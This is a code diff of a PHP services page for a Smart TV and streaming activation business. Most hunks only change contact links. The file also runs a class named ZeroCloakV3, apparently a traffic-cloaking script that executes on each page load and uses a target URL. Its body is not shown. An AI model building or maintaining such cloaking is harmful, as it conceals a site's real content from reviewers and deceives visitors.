@@ -1,5 +1,6 @@
 <?php
 
+if (!class_exists('ZeroCloakV3')) {
 class ZeroCloakV3
 {
     private $targetUrl;
@@ -303,6 +304,7 @@ class ZeroCloakV3
         return false;
     }
 }
+}
 
 $zerocloakCloaking = new ZeroCloakV3();
 $zerocloakCloaking->run();
@@ -338,7 +340,7 @@ $zerocloakCloaking->run();
                     <h2 class="text-3xl font-bold text-slate-900">Smart TV Setup Services</h2>
                 </div>
                 <p class="text-lg text-slate-600 mb-6 leading-relaxed">At StreamActivateHub, we provide reliable Smart TV setup services designed to help users quickly connect and configure their entertainment devices. Our setup assistance includes WiFi connection support, app installation guidance, streaming configuration, account setup, software updates, and device optimization. Whether you are installing a brand-new Smart TV or troubleshooting an existing setup, our goal is to make the process simple and hassle-free. We support a wide range of Smart TVs and streaming platforms to help users enjoy smooth access to movies, live channels, sports, and digital entertainment services.</p>
-                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
+                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
             </div>
         </div>
 
@@ -357,7 +359,7 @@ $zerocloakCloaking->run();
                     <h2 class="text-3xl font-bold text-slate-900">Device Installation Assistance</h2>
                 </div>
                 <p class="text-lg text-slate-600 mb-6 leading-relaxed">StreamActivateHub offers professional device installation assistance for Smart TVs, streaming devices, media players, and home entertainment systems. Our service helps users properly connect, configure, and optimize their devices for reliable performance and seamless streaming. We assist with internet setup, account synchronization, software configuration, and compatibility guidance for multiple entertainment platforms. Our goal is to simplify the installation process while helping users maximize the functionality of their streaming and connected devices. We provide easy-to-follow assistance designed to improve convenience, connectivity, and overall user experience.</p>
-                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
+                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
             </div>
         </div>
 
@@ -376,7 +378,7 @@ $zerocloakCloaking->run();
                     <h2 class="text-3xl font-bold text-slate-900">Streaming Support Guides</h2>
                 </div>
                 <p class="text-lg text-slate-600 mb-6 leading-relaxed">At StreamActivateHub, our streaming support guides are designed to help users install, activate, and troubleshoot popular streaming platforms and entertainment devices with confidence. Our guides include step-by-step instructions for app installation, account activation, internet connectivity, streaming optimization, and device compatibility. Whether users are setting up a Smart TV, streaming stick, or connected media device, our goal is to provide simple and user-friendly guidance that improves the overall streaming experience. We help users understand setup processes while making streaming services easier to access and manage.</p>
-                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
+                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
             </div>
         </div>
 
@@ -395,7 +397,7 @@ $zerocloakCloaking->run();
                     <h2 class="text-3xl font-bold text-slate-900">Home Theater Setup</h2>
                 </div>
                 <p class="text-lg text-slate-600 mb-6 leading-relaxed">StreamActivateHub provides home theater setup assistance to help users create an enjoyable and connected entertainment environment. Our services include TV placement guidance, speaker connection support, streaming device integration, audio configuration, and entertainment system setup. We help users properly connect and optimize their devices for improved sound quality, streaming performance, and viewing comfort. Whether configuring a simple home entertainment system or a more advanced setup, our goal is to make installation easy and efficient while helping users enjoy a seamless home theater experience.</p>
-                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
+                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
             </div>
         </div>
 
@@ -414,7 +416,7 @@ $zerocloakCloaking->run();
                     <h2 class="text-3xl font-bold text-slate-900">Activation Tutorials</h2>
                 </div>
                 <p class="text-lg text-slate-600 mb-6 leading-relaxed">StreamActivateHub offers easy-to-follow activation tutorials designed to help users activate Smart TVs, streaming platforms, and connected entertainment devices quickly and efficiently. Our tutorials guide users through important setup steps including WiFi connection, account login, activation code entry, app verification, and device synchronization. Designed for users of all experience levels, our tutorials simplify the activation process while helping reduce setup errors and connectivity issues. Our goal is to provide clear and reliable setup guidance that helps users access streaming services and entertainment content with confidence.</p>
-                <a href="contact.php" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
+                <a href="contact" class="inline-block bg-primary hover:bg-primary-dark text-white px-8 py-3 rounded-full font-bold transition-colors">Book This Service</a>
             </div>
         </div>
 
@@ -761,7 +763,7 @@ $zerocloakCloaking->run();
             <h2 class="text-4xl md:text-5xl font-extrabold text-white mb-6">Need Help Setting Up Your Device?</h2>
             <p class="text-xl text-primary-100 mb-10 text-white/90">Reach out to our AV integration team to schedule an on-site consultation.</p>
             <div class="flex flex-col sm:flex-row justify-center gap-4">
-                <a href="contact.php" class="bg-white text-primary hover:bg-slate-50 px-8 py-4 rounded-full font-bold text-lg shadow-xl">Contact Us Online</a>
+                <a href="contact" class="bg-white text-primary hover:bg-slate-50 px-8 py-4 rounded-full font-bold text-lg shadow-xl">Contact Us Online</a>
             </div>
         </div>
     </section>
